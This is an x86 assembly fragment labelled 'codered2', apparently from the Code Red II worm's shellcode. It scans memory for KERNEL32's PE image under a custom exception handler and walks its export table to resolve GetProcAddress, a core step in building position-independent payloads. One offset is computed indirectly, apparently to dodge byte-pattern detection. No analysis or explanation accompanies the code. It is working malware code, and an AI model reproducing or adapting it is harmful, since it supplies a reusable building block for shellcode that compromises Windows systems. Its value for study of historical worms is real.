;codered2

find_getprocaddress:    mov     ebx, 77E00000h-65536
@@1:                    add     ebx, 65536
                        cmp     ebx, 78000000h
                        jne     @@2
                        mov     ebx, 0BFF00000h
@@2:                    pusha
                        call    @@seh
                        mov     esp, [esp+8]
@@3:                    pop     dword ptr fs:[0]
                        pop     eax
                        popa
                        jmp     @@1
@@seh:                  push    dword ptr fs:[0]
                        mov     fs:[0], esp
                        cmp     word ptr [ebx], 'ZM'
                        jne     @@3
                        mov     ecx, [ebx+3Ch]
                        cmp     dword ptr [ebx+ecx], 'EP'
                        jne     @@3
                        mov     edx, [ebx+ecx+78h]      ; export rva
                        add     edx, ebx
                        mov     eax, [edx+0Ch]      ; dll name
                        cmp     dword ptr [ebx+eax], 'NREK'
                        jne     @@3
                        cmp     dword ptr [ebx+eax+4], '23LE'
                        jne     @@3
                        xor     ecx, ecx
                        dec     ecx
;                        mov     esi, [edx+20h]      ; namepointers
push 10h
pop eax
shl eax,1
mov esi,[edx+eax]
                        add     esi, ebx
                        cld
@@cmp:                  inc     ecx
                        lodsd
                        cmp     dword ptr [ebx+eax], 'PteG'
                        jne     @@cmp
                        cmp     dword ptr [ebx+eax+4], 'Acor'
                        jne     @@cmp
                        add     ecx, [edx+10h]      ; +ordinalbase
                        dec     ecx                 ; -1
                        shl     ecx, 1              ; *2
                        add     ecx, [edx+24h]      ; +ordinaltablerva
                        movzx   ecx, word ptr [ebx+ecx] ; ordinal
                        shl     ecx, 2              ; *4
                        add     ecx, [edx+1Ch]      ; +addresstablerva
                        mov     eax, [ebx+ecx]      ; EDI=GetProcAddress
                        add     eax, ebx            ;  +imagebase
                        mov     [esp+8].popa_eax, eax
                        pop     dword ptr fs:[0]
                        pop     eax
                        popa
                        retn
